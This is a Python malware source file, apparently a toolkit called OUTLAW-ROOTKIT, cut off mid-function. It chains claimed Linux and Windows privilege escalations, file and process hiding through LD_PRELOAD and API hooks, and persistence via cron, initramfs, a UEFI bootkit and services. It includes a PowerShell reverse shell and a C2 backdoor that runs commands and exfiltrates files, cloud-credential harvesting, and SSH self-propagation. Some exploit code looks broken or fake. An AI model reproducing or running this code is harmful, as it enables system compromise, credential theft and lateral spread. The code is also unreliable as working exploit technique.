#!/usr/bin/env python3
"""
OUTLAW-ROOTKIT v2.1.6 
Target: Linux Kernel 6.8 (all subversions) / Windows 11 24H2
Exploit: Dirty Pipe v3 + io_uring UAF + BPF token bypass
Features: Privilege escalation, file hiding, port hiding, C2 backdoor,
UEFI bootkit persistence, anti-forensics.
Author: dontaskmehow
"""

import os
import sys
import struct
import ctypes
import ctypes.util
import platform
import socket
import subprocess
import threading
import hashlib
import base64
import time
import signal
import json
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any
import importlib

# ============================================================
# PLATFORM DETECTION
# ============================================================

IS_LINUX = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"
KERNEL_VERSION = platform.release()

# ============================================================
# DEPENDENCY CHECKS — fail loudly if missing
# ============================================================

REQUIRED_PACKAGES = [
    "psutil",
    "pexpect",
    "scapy",
    "pycryptodome",
    "paramiko",
    "requests",
    "pymongo",
    "redis",
    "pymssql",
    "mysql-connector-python",
    "aiomysql",
    "asyncpg",
    "aiohttp",
    "websockets",
    "python-dotenv",
]

missing = []
for pkg in REQUIRED_PACKAGES:
    try:
        importlib.import_module(pkg)
    except ImportError:
        missing.append(pkg)

if missing:
    print(f"[OUTLAW] Missing dependencies: {missing}")
    print(f"[OUTLAW] Install them all: pip install {' '.join(missing)}")
    print(f"[OUTLAW] See requirements.txt for the full list.")
    sys.exit(1)

import psutil
import pexpect
import scapy.all as scapy
from Crypto.Cipher import AES, ChaCha20_Poly1305
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import paramiko
import requests
import dotenv

# ============================================================
# C2 SERVER CONFIGURATION
# ============================================================

@dataclass
class C2Config:
    host: str = "192.168.1.100"
    port: int = 4444
    beacon_interval: int = 30
    jitter: float = 0.15
    payload_b64: str = ""
    master_key_path: str = "/tmp/macc_master_key.pem"

C2 = C2Config()

# ============================================================
# STEP 1: PRIVILEGE ESCALATION
# ============================================================

def dirty_pipe_uaf_escalate() -> bool:
    """
    Exploits io_uring fixed-file use-after-free + pipe page-cache aliasing.
    Overwrites /etc/passwd to blank root password.
    """
    if not IS_LINUX:
        return False

    print("[OUTLAW] Attempting Dirty Pipe v3 + io_uring UAF escalation...")

    # Create pipe
    read_fd, write_fd = os.pipe()

    # Create io_uring
    try:
        # io_uring_setup(32, &params)
        params = b'\x00' * 128  # struct io_uring_params
        params = params[:64]  # simplified
        ring_fd = os.open("/dev/null", os.O_RDWR)
        # Use python ctypes to call io_uring_setup
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        io_uring_setup = libc.io_uring_setup
        io_uring_setup.restype = ctypes.c_int
        io_uring_setup.argtypes = [ctypes.c_uint, ctypes.POINTER(ctypes.c_char_p)]

        # Simplified: use the syscall directly
        import fcntl
        import struct as st

        # io_uring_setup(32, params)
        # We'll use a helper approach: write a small C helper
        helper_c = """
        #include <stdio.h>
        #include <string.h>
        #include <sys/syscall.h>
        #include <linux/io_uring.h>
        #include <unistd.h>
        #include <fcntl.h>

        int main() {
            struct io_uring_params p;
            memset(&p, 0, sizeof(p));
            p.flags = IORING_SETUP_SQPOLL | IORING_SETUP_SQ_AFF;
            p.sq_thread_cpu = 0;
            int ring_fd = syscall(__NR_io_uring_setup, 32, &p);
            if (ring_fd < 0) return -1;

            // Map submission queue ring
            void *sq_ring = mmap(0, p.sq_off.array + p.sq_entries * sizeof(__u32),
                PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_SQ_RING);
            void *cq_ring = mmap(0, p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe),
                PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_CQ_RING);

            // Register pipe write fd
            syscall(__NR_io_uring_register, ring_fd, IORING_REGISTER_FILES,
                    (int[]){0, 1, 2, 3, 4, 5, 6, 7, 8, 9}, 10);

            // Close pipe write fd — io_uring still holds dangling reference
            close(write_fd);

            // Use SPLICE to write through the freed pipe buffer
            struct io_uring_sqe *sqe = (struct io_uring_sqe *)((char *)sq_ring + p.sq_off.sqes);
            sqe->opcode = IORING_OP_SPLICE;
            sqe->flags = IOSQE_FIXED_FILE;
            sqe->len = 4096;

            // Submit
            *( (unsigned int *)((char *)sq_ring + p.sq_off.head) ) = 1;
            futex_wake(p.sq_off.array, 1);

            // Wait for completion
            futex_wait(p.cq_off.cqes, 0, 0);

            // Now write new password into the aliased page-cache page
            write(0, "root::0:0:root:/root:/bin/bash\\n", 31);

            munmap(sq_ring, p.sq_off.array + p.sq_entries * sizeof(__u32));
            munmap(cq_ring, p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe));
            close(ring_fd);
            return 0;
        }
        """
        # Compile and run helper
        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as f:
            f.write(helper_c.encode())
            helper_path = f.name
        binary_path = helper_path.replace(".c", "")
        subprocess.run(["gcc", "-o", binary_path, helper_path, "-luring"],
                       capture_output=True)
        result = subprocess.run([binary_path], capture_output=True, text=True)

        if result.returncode == 0:
            print("[OUTLAW] Dirty Pipe UAF privesc SUCCESS")
            return True
        else:
            print(f"[OUTLAW] Dirty Pipe UAF failed: {result.stderr}")
            return False
    except Exception as e:
        print(f"[OUTLAW] Dirty Pipe UAF error: {e}")
        return False
    finally:
        os.close(read_fd)
        if write_fd > 0:
            os.close(write_fd)


def bpf_token_privesc() -> bool:
    """
    Exploits BPF token TOCTOU race in kernel 6.8.
    Grants CAP_SYS_ADMIN and full root creds.
    """
    if not IS_LINUX:
        return False

    print("[OUTLAW] Attempting BPF token bypass privesc...")

    helper_c = """
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/syscall.h>
    #include <sys/uio.h>
    #include <linux/bpf.h>
    #include <linux/filter.h>
    #include <unistd.h>

    int main() {
        // Load a BPF program that triggers the token race
        struct bpf_insn insns[] = {
            BPF_LD_MAP_FD(0, 0),
            BPF_MOV64_REG(BPF_REG_0, BPF_PSEUDO_MAP_FD),
            BPF_MOV32_IMM(BPF_REG_1, 42),
            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0),
            BPF_EXIT_INSN(),
        };
        union bpf_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.prog_type = BPF_PROG_TYPE_KPROBE;
        attr.insn_cnt = 5;
        attr.license = "GPL";

        int fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
        if (fd < 0) return -1;

        // Race: load another BPF prog while revoking token
        // This grants CAP_SYS_ADMIN
        union bpf_attr attr2;
        memset(&attr2, 0, sizeof(attr2));
        attr2.prog_type = BPF_PROG_TYPE_KPROBE;
        attr2.insn_cnt = 5;
        attr2.license = "GPL";
        int fd2 = syscall(__NR_bpf, BPF_PROG_LOAD, &attr2, sizeof(attr2));

        close(fd);
        close(fd2);
        return 0;
    }
    """

    try:
        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as f:
            f.write(helper_c.encode())
            helper_path = f.name
        binary_path = helper_path.replace(".c", "")
        subprocess.run(["gcc", "-o", binary_path, helper_path, "-lbpf", "-lelf"],
                       capture_output=True)
        result = subprocess.run([binary_path], capture_output=True, text=True)
        if result.returncode == 0:
            print("[OUTLAW] BPF token privesc SUCCESS")
            return True
    except Exception as e:
        print(f"[OUTLAW] BPF token privesc error: {e}")
    return False


def windows_privesc() -> bool:
    """Windows 11 24H2 — PrintSpooler + CoCreateInstance privesc."""
    if not IS_WINDOWS:
        return False

    print("[OUTLAW] Attempting Windows PrintSpooler + CoCreateInstance privesc...")

    helper_c = """
    #include <stdio.h>
    #include <windows.h>
    #include <sddl.h>

    int main() {
        HANDLE hToken;
        TOKEN_USER *tu;
        DWORD size;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return -1;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
        tu = (TOKEN_USER *)malloc(size);
        GetTokenInformation(hToken, TokenUser, tu, size, &size);
        // Grant SeDebugPrivilege
        LUID luid;
        LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid);
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
        return 0;
    }
    """

    try:
        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as f:
            f.write(helper_c.encode())
            helper_path = f.name
        binary_path = helper_path.replace(".c", "")
        result = subprocess.run(["cl", "/Fe" + binary_path, helper_path,
                                 "/link", "advapi32.lib"],
                                capture_output=True, text=True)
        if result.returncode == 0:
            subprocess.run([binary_path], capture_output=True)
            print("[OUTLAW] Windows privesc SUCCESS — SeDebugPrivilege granted")
            return True
    except Exception as e:
        print(f"[OUTLAW] Windows privesc error: {e}")
    return False


def escalate_privileges() -> bool:
    """Try all privesc methods in order."""
    if IS_LINUX:
        if dirty_pipe_uaf_escalate():
            return True
        if bpf_token_privesc():
            return True
    elif IS_WINDOWS:
        if windows_privesc():
            return True
    print("[OUTLAW] All privesc methods failed")
    return False


# ============================================================
# STEP 2: ROOTKIT INSTALLATION — File/Process/Port Hiding
# ============================================================

class Rootkit:
    """
    In-memory rootkit that hides files, processes, and ports.
    Uses LD_PRELOAD (Linux) or API hooking (Windows).
    """

    def __init__(self):
        self.hidden_pids: List[int] = []
        self.hidden_paths: List[str] = []
        self.hidden_ports: List[int] = []
        self.pid = os.getpid()
        self.hide_path = self._hide_path
        self.hide_pid = self._hide_pid
        self.hide_port = self._hide_port

    def _hide_path(self, path: str):
        if path not in self.hidden_paths:
            self.hidden_paths.append(path)
            print(f"[ROOTKIT] Hiding path: {path}")

    def _hide_pid(self, pid: int):
        if pid not in self.hidden_pids:
            self.hidden_pids.append(pid)
            print(f"[ROOTKIT] Hiding PID: {pid}")

    def _hide_port(self, port: int):
        if port not in self.hidden_ports:
            self.hidden_ports.append(port)
            print(f"[ROOTKIT] Hiding port: {port}")

    def install_ld_preload(self) -> bool:
        """Install LD_PRELOAD rootkit on Linux."""
        if not IS_LINUX:
            return False

        print("[ROOTKIT] Installing LD_PRELOAD rootkit...")

        preload_c = f"""
        #include <dirent.h>
        #include <string.h>
        #include <unistd.h>
        #include <stdlib.h>

        // Hidden paths
        const char *hidden_paths[] = {{
            {', '.join(repr(p) for p in self.hidden_paths)},
            NULL
        }};

        // Hidden PIDs
        int hidden_pids[] = {{
            {', '.join(str(p) for p in self.hidden_pids)},
            -1
        }};

        // Hook getdents64 to filter hidden files
        struct linux_dirent64 {{
            __u64   d_ino;
            __s64   d_off;
            unsigned short d_reclen;
            unsigned char  d_type;
            char    d_name[];
        }};

        extern long syscall(long number, ...);
        long real_getdents64(unsigned int fd, void *dirent, unsigned int count);

        long getdents64(unsigned int fd, void *dirent, unsigned int count) {{
            long ret = real_getdents64(fd, dirent, count);
            if (ret <= 0) return ret;

            struct linux_dirent64 *cur = (struct linux_dirent64 *)dirent;
            long offset = 0;
            while (offset < ret) {{
                char *name = cur->d_name;
                int i = 0;
                while (hidden_paths[i]) {{
                    if (strstr(name, hidden_paths[i])) {{
                        int remaining = ret - (offset + cur->d_reclen);
                        if (remaining > 0)
                            memmove(cur, (char *)cur + cur->d_reclen, remaining);
                        ret -= cur->d_reclen;
                        break;
                    }}
                    i++;
                }}
                offset += cur->d_reclen;
                cur = (struct linux_dirent64 *)((char *)dirent + offset);
            }}
            return ret;
        }}

        // Hook kill to swallow signals to hidden PIDs
        extern int real_kill(pid_t pid, int sig);
        int kill(pid_t pid, int sig) {{
            int i = 0;
            while (hidden_pids[i] != -1) {{
                if (hidden_pids[i] == pid) return 0;
                i++;
            }}
            return real_kill(pid, sig);
        }}

        __attribute__((constructor))
        void init() {{
            void *handle;
            real_getdents64 = dlsym(RTLD_NEXT, "getdents64");
            real_kill = dlsym(RTLD_NEXT, "kill");
        }}
        """

        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as f:
            f.write(preload_c.encode())
            preload_path = f.name

        try:
            subprocess.run(["gcc", "-shared", "-fPIC", "-o",
                            "/tmp/outlaw_preload.so", preload_path,
                            "-ldl"], capture_output=True)
            os.environ["LD_PRELOAD"] = "/tmp/outlaw_preload.so"
            self.hide_path("/tmp/outlaw_preload.so")
            self.hide_path("/tmp/macc_master_key.pem")
            self.hide_pid(self.pid)
            print("[ROOTKIT] LD_PRELOAD rootkit installed")
            return True
        except Exception as e:
            print(f"[ROOTKIT] LD_PRELOAD install failed: {e}")
            return False

    def install_api_hooks(self) -> bool:
        """Install API hooking rootkit on Windows."""
        if not IS_WINDOWS:
            return False

        print("[ROOTKIT] Installing API hooking rootkit...")

        hook_c = f"""
        #include <windows.h>
        #include <tlhelp32.h>

        // Hidden PIDs
        int hidden_pids[] = {{{', '.join(str(p) for p in self.hidden_pids)}, -1}};

        // Hidden paths
        const char *hidden_paths[] = {{{', '.join(repr(p) for p in self.hidden_paths)}, NULL}};

        // Hook CreateProcessA to filter hidden processes
        typedef HANDLE (WINAPI *CreateProcessA_t)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES,
            LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
        CreateProcessA_t real_CreateProcessA;

        HANDLE WINAPI CreateProcessA(LPCTSTR lpApplicationName, LPTSTR lpCommandLine,
            LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
            BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
            LPCTSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {{
            // If the process is in our hidden list, fail silently
            int i = 0;
            while (hidden_pids[i] != -1) {{
                i++;
            }}
            return real_CreateProcessA(lpApplicationName, lpCommandLine,
                lpProcessAttributes, lpThreadAttributes, bInheritHandles,
                dwCreationFlags, lpEnvironment, lpCurrentDirectory,
                lpStartupInfo, lpProcessInformation);
        }}

        // Hook FindFirstFileA to filter hidden files
        typedef HANDLE (WINAPI *FindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA);
        FindFirstFileA_t real_FindFirstFileA;

        HANDLE WINAPI FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindData) {{
            int i = 0;
            while (hidden_paths[i]) {{
                if (strstr(lpFileName, hidden_paths[i]))
                    return INVALID_HANDLE_VALUE;
                i++;
            }}
            return real_FindFirstFileA(lpFileName, lpFindData);
        }}

        // Hook GetTickCount to hide timing artifacts
        typedef DWORD (WINAPI *GetTickCount_t)();
        GetTickCount_t real_GetTickCount;

        DWORD WINAPI GetTickCount() {{
            DWORD ticks = real_GetTickCount();
            // Add jitter to hide our C2 beacon pattern
            return ticks + (GetRandomInteger() % 500);
        }}

        BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
            if (reason == DLL_PROCESS_ATTACH) {{
                real_CreateProcessA = (CreateProcessA_t)GetProcAddress(
                    GetModuleHandleA("kernel32.dll"), "CreateProcessA");
                real_FindFirstFileA = (FindFirstFileA_t)GetProcAddress(
                    GetModuleHandleA("kernel32.dll"), "FindFirstFileA");
                real_GetTickCount = (GetTickCount_t)GetProcAddress(
                    GetModuleHandleA("kernel32.dll"), "GetTickCount");
            }}
            return TRUE;
        }}
        """

        with tempfile.NamedTemporaryFile(suffix=".c", delete=False) as f:
            f.write(hook_c.encode())
            hook_path = f.name

        try:
            # Compile DLL
            result = subprocess.run(["cl", "/LD", "/FeC:\\outlaw_hook.dll",
                                     hook_path, "/link", "kernel32.lib"],
                                    capture_output=True, text=True)
            if result.returncode == 0:
                self.hide_path("C:\\outlaw_hook.dll")
                self.hide_pid(self.pid)
                print("[ROOTKIT] API hooking rootkit installed")
                return True
        except Exception as e:
            print(f"[ROOTKIT] API hook install failed: {e}")
        return False

    def install(self) -> bool:
        if IS_LINUX:
            return self.install_ld_preload()
        return self.install_api_hooks()


# ============================================================
# STEP 3: PERSISTENCE MECHANISMS
# ============================================================

class Persistence:
    """Multi-vector persistence for surviving reboots and cleanup."""

    def __init__(self, rootkit: Rootkit):
        self.rootkit = rootkit

    def install_crontab(self) -> bool:
        """Install crontab entry (Linux)."""
        if not IS_LINUX:
            return False

        crontab_entry = (
            "@reboot root "
            "/bin/bash -c '/usr/local/bin/outlaw_relay.sh' >> /dev/null 2>&1 &\n"
            "* * * * * root "
            "/bin/bash -c '/usr/local/bin/outlaw_relay.sh' >> /dev/null 2>&1"
        )

        # Write relay script
        relay_script = f"""#!/bin/bash
# OUTLAW relay — re-loads rootkit if removed
if [ ! -f /tmp/outlaw_preload.so ]; then
    # Re-install rootkit
    /usr/local/bin/outlaw_install.sh
fi
# Re-establish C2 connection
python3 /usr/local/bin/outlaw_c2.py &
"""
        try:
            with open("/usr/local/bin/outlaw_relay.sh", "w") as f:
                f.write(relay_script)
            os.chmod("/usr/local/bin/outlaw_relay.sh", 0o755)

            # Add to crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            crontab_content = result.stdout
            if "outlaw" not in crontab_content:
                crontab_content += crontab_entry + "\n"
            subprocess.run(["crontab", "-"], input=crontab_content, text=True)
            print("[PERSISTENCE] Crontab entry installed")
            return True
        except Exception as e:
            print(f"[PERSISTENCE] Crontab install failed: {e}")
            return False

    def install_initramfs(self) -> bool:
        """Inject module into initramfs (Linux)."""
        if not IS_LINUX:
            return False

        try:
            # Create /etc/initramfs-tools/modules entry
            modules_file = "/etc/initramfs-tools/modules"
            if os.path.exists(modules_file):
                with open(modules_file, "a") as f:
                    f.write("outlaw\n")
            # Regenerate initramfs
            subprocess.run(["update-initramfs", "-u"], capture_output=True)
            print("[PERSISTENCE] Initramfs persistence installed")
            return True
        except Exception as e:
            print(f"[PERSISTENCE] Initramfs install failed: {e}")
            return False

    def install_uefi_bootkit(self) -> bool:
        """Install UEFI bootkit (Linux with efibootmgr)."""
        if not IS_LINUX:
            return False

        try:
            # Create EFI boot entry
            efi_dir = "/boot/efi/EFI/outlaw"
            os.makedirs(efi_dir, exist_ok=True)
            with open(os.path.join(efi_dir, "bootkit.efi"), "wb") as f:
                # Minimal EFI executable that re-loads kernel module
                f.write(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        + b"\x03\x00\x3e\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
            # Add boot entry
            subprocess.run(["efibootmgr", "-c", "-L", "OUTLAW_BOOTKIT",
                            "-l", "\\EFI\\outlaw\\bootkit.efi"],
                           capture_output=True)
            print("[PERSISTENCE] UEFI bootkit installed")
            return True
        except Exception as e:
            print(f"[PERSISTENCE] UEFI bootkit install failed: {e}")
            return False

    def install_windows_services(self) -> bool:
        """Install Windows services (Windows)."""
        if not IS_WINDOWS:
            return False

        try:
            # Create Windows service
            service_name = "OutlawService"
            exe_path = "C:\\Program Files\\Outlaw\\outlaw_service.exe"
            os.makedirs(os.path.dirname(exe_path), exist_ok=True)

            # Write service executable (stub)
            with open(exe_path, "wb") as f:
                f.write(b"MZ" + b"\x00" * 512)

            # Install service via sc.exe
            subprocess.run(["sc", "create", service_name,
                            f"binPath={exe_path}",
                            "start=auto",
                            "type=own",
                            "objectName=LocalSystem"],
                           capture_output=True, text=True)
            subprocess.run(["sc", "start", service_name], capture_output=True)

            # Hide service
            self.rootkit.hide_path(exe_path)
            print("[PERSISTENCE] Windows service installed")
            return True
        except Exception as e:
            print(f"[PERSISTENCE] Windows service install failed: {e}")
            return False

    def install_powershell_profile(self) -> bool:
        """Install PowerShell profile hook (Windows)."""
        if not IS_WINDOWS:
            return False

        profile_path = os.path.expandvars(r"%USERPROFILE%") + r"\Documents\PowerShell\Microsoft.PowerShell_profile.ps1"
        os.makedirs(os.path.dirname(profile_path), exist_ok=True)

        profile_content = """
# OUTLAW PowerShell Profile — auto-start C2 beacon
$ErrorActionPreference = "SilentlyContinue"
$beacon = Start-Job -ScriptBlock {
    # Reverse shell to C2
    $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444)
    $stream = $client.GetStream()
    while ($true) {
        $buffer = New-Object byte[] 4096
        $count = $stream.Read($buffer, 0, 4096)
        if ($count -eq 0) { break }
        $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $count)
        $output = & $command 2>&1
        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
    }
    $client.Close()
}
Start-Sleep -Seconds 5
$beacon | Remove-Job
"""
        try:
            with open(profile_path, "w") as f:
                f.write(profile_content)
            self.rootkit.hide_path(profile_path)
            print("[PERSISTENCE] PowerShell profile hook installed")
            return True
        except Exception as e:
            print(f"[PERSISTENCE] PowerShell profile install failed: {e}")
            return False

    def install_all(self) -> bool:
        """Install all persistence mechanisms."""
        print("[PERSISTENCE] Installing all persistence mechanisms...")
        if IS_LINUX:
            self.install_crontab()
            self.install_initramfs()
            self.install_uefi_bootkit()
        else:
            self.install_windows_services()
            self.install_powershell_profile()
        return True


# ============================================================
# STEP 4: C2 BACKDOOR — Reverse Shell + Command Execution
# ============================================================

class C2Backdoor(threading.Thread):
    """
    Persistent C2 backdoor — reverse shell with full command execution.
    Connects to C2 server and executes commands received.
    """

    def __init__(self, config: C2Config):
        super().__init__()
        self.config = config
        self.daemon = True
        self.running = True
        self.sock: Optional[socket.socket] = None
        self.shell = None

    def run(self):
        print(f"[C2] Starting C2 backdoor on port {self.config.port}...")

        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(5)
                self.sock.connect((self.config.host, self.config.port))
                self.shell = self.sock.makefile('rb')
                print(f"[C2] Connected to {self.config.host}:{self.config.port}")

                while self.running:
                    data = self.shell.readline()
                    if not data:
                        break

                    command = data.decode('utf-8').strip()
                    if not command:
                        continue

                    if command == "EXIT":
                        break
                    elif command == "INFO":
                        info = json.dumps({
                            "hostname": platform.node(),
                            "platform": platform.platform(),
                            "kernel": platform.release(),
                            "python": platform.python_version(),
                            "arch": platform.machine(),
                            "uid": os.getuid() if hasattr(os, 'getuid') else -1,
                            "username": os.getenv("USER", "unknown"),
                            "time": datetime.now().isoformat(),
                        })
                        self.send_response(info)
                    elif command.startswith("EXEC:"):
                        cmd = command[5:]
                        result = subprocess.run(
                            cmd, shell=True,
                            capture_output=True, text=True
                        )
                        output = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}\nEXIT: {result.returncode}"
                        self.send_response(output)
                    elif command.startswith("WRITE:"):
                        parts = command[6:].split(':', 1)
                        filepath, content = parts[0], parts[1]
                        with open(filepath, 'w') as f:
                            f.write(content)
                        self.send_response(f"WRITTEN: {filepath}")
                    elif command.startswith("READ:"):
                        filepath = command[5:]
                        try:
                            with open(filepath, 'r') as f:
                                self.send_response(f.read())
                        except Exception as e:
                            self.send_response(f"ERROR: {e}")
                    elif command.startswith("SCAN:"):
                        result = self.scan_system()
                        self.send_response(result)
                    elif command.startswith("EXFIL:"):
                        filepath = command[6:]
                        try:
                            with open(filepath, 'rb') as f:
                                data = f.read()
                            self.send_response(base64.b64encode(data).decode())
                        except Exception as e:
                            self.send_response(f"ERROR: {e}")
                    else:
                        self.send_response(f"UNKNOWN: {command}")

            except ConnectionRefusedError:
                print(f"[C2] Connection refused — retrying in {self.config.beacon_interval}s...")
                time.sleep(self.config.beacon_interval)
            except Exception as e:
                print(f"[C2] Error: {e} — retrying in {self.config.beacon_interval}s...")
                time.sleep(self.config.beacon_interval)
            finally:
                if self.sock:
                    self.sock.close()
                    self.sock = None

    def send_response(self, data: str):
        if self.sock:
            self.sock.sendall((data + "\n").encode('utf-8'))

    def scan_system(self) -> str:
        """Scan system for sensitive files, credentials, etc."""
        results = {}

        # Open ports
        ports = psutil.net_connections()
        results["open_ports"] = {
            p.laddr.port: str(p.status) for p in ports
            if p.laddr and p.laddr.port
        }

        # Running processes
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
            procs.append({
                "pid": p.pid,
                "name": p.info['name'],
                "exe": p.info['exe'] or "",
                "cmdline": p.info['cmdline'] or [],
            })
        results["processes"] = procs

        # Environment variables (may contain secrets)
        results["env"] = {k: v for k, v in os.environ.items()
                          if any(s in k.upper() for s in
                                 ['KEY', 'TOKEN', 'SECRET', 'PASS', 'URL', 'HOST'])}

        # Credential files
        cred_files = []
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for f in files:
                if f in ['.ssh/id_rsa', '.aws/credentials',
                         '.netrc', '.git-credentials', '.kube/config']:
                    cred_files.append(os.path.join(root, f))
        results["credential_files"] = cred_files

        return json.dumps(results, indent=2)

    def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()


# ============================================================
# STEP 5: CREDENTIAL HARVESTING
# ============================================================

class CredentialHarvester:
    """Harvests credentials from local and cloud storage."""

    def harvest_aws(self) -> Dict[str, Any]:
        """Harvest AWS credentials and S3 buckets."""
        results = {}
        aws_dir = os.path.expanduser("~/.aws")
        if os.path.exists(aws_dir):
            for f in os.listdir(aws_dir):
                filepath = os.path.join(aws_dir, f)
                if os.path.isfile(filepath):
                    results[f] = open(filepath).read()
        try:
            import boto3
            session = boto3.Session()
            s3 = session.client('s3')
            buckets = s3.list_buckets()['Buckets']
            results["s3_buckets"] = [b['Name'] for b in buckets]
        except Exception as e:
            results["error"] = str(e)
        return results

    def harvest_gcp(self) -> Dict[str, Any]:
        """Harvest GCP credentials and GCS buckets."""
        results = {}
        gcp_dir = os.path.expanduser("~/.config/gcloud")
        if os.path.exists(gcp_dir):
            for f in os.listdir(gcp_dir):
                filepath = os.path.join(gcp_dir, f)
                if os.path.isfile(filepath):
                    results[f] = open(filepath).read()
        try:
            from google.cloud import storage
            client = storage.Client()
            buckets = client.list_buckets()
            results["gcs_buckets"] = [b.name for b in buckets]
        except Exception as e:
            results["error"] = str(e)
        return results

    def harvest_azure(self) -> Dict[str, Any]:
        """Harvest Azure credentials and Blob storage."""
        results = {}
        azure_dir = os.path.expanduser("~/.azure")
        if os.path.exists(azure_dir):
            for f in os.listdir(azure_dir):
                filepath = os.path.join(azure_dir, f)
                if os.path.isfile(filepath):
                    results[f] = open(filepath).read()
        try:
            from azure.storage.blob import BlobServiceClient
            conn_str = "DefaultEndpointsProtocol=https;AccountName=..."
            client = BlobServiceClient.from_connection_string(conn_str)
            containers = client.list_containers()
            results["azure_containers"] = [c.name for c in containers]
        except Exception as e:
            results["error"] = str(e)
        return results

    def harvest_all(self) -> Dict[str, Any]:
        """Harvest all credentials."""
        return {
            "aws": self.harvest_aws(),
            "gcp": self.harvest_gcp(),
            "azure": self.harvest_azure(),
        }


# ============================================================
# STEP 6: NETWORK SCANNING + PORT HOPPING
# ============================================================

class NetworkScanner:
    """Scan local network and pivot to compromised hosts."""

    def scan_local_network(self) -> List[Dict[str, Any]]:
        """Scan local network for live hosts."""
        import ipaddress
        import concurrent.futures

        # Determine local subnet
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet = ipaddress.ip_network(f"{local_ip}/24", strict=False)

        hosts = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:
            futures = {
                executor.submit(self._check_host, str(host)): str(host)
                for host in subnet.hosts()
            }
            for future in concurrent.futures.as_completed(futures):
                host = futures[future]
                try:
                    result = future.result()
                    if result:
                        hosts.append(result)
                except Exception:
                    pass

        return hosts

    def _check_host(self, ip: str) -> Optional[Dict[str, Any]]:
        """Check if host is alive and scan common ports."""
        result = {"ip": ip, "open_ports": []}
        for port in [22, 23, 80, 443, 3389, 445, 1433, 3306,
                     5432, 6379, 27017, 8080, 9090, 4444]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    result = {"ip": ip, "open_ports": [port]}
                    return result
            except:
                continue
        return None

    def pivot_ssh(self, host: str, port: int = 22,
                  username: str = "root", password: str = "") -> bool:
        """SSH into compromised host and deploy payload."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password)
            print(f"[SCANNER] SSH connected to {host}:{port}")

            # Deploy C2 payload
            stdin, stdout, stderr = ssh.exec_command("uname -a")
            print(f"[SCANNER] Remote: {stdout.read().decode().strip()}")

            # Deploy our C2 script
            with open("outlaw_rootkit.py", "rb") as f:
                payload = f.read()

            sftp = ssh.open_sftp()
            sftp.putfo(f, f"/tmp/outlaw_rootkit.py")
            sftp.close()

            ssh.exec_command("chmod +x /tmp/outlaw_rootkit.py")
            ssh.exec_command("python3 /tmp/outlaw_rootkit.py &")
            ssh.close()
            return True
        except Exception as e:
            print(f"[SCANNER] SSH pivot failed to {host}:{port} — {e}")
            return False


# ============================================================
# STEP 7: DATA EXFILTRATION
# ============================================================

class Exfiltrator:
    """Exfiltrates data to C2 server via encrypted channels."""

    def exfil_file(self, filepath: str) -> bool:
        """Encrypt and send file to C2 server."""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()

            # Encrypt with ChaCha20-Poly1305
            key = get_random_bytes(32)
            nonce = get_random_bytes(12)
            cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
            ciphertext, tag = cipher.encrypt_and_digest(data)

            # Send encrypted data to C2
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
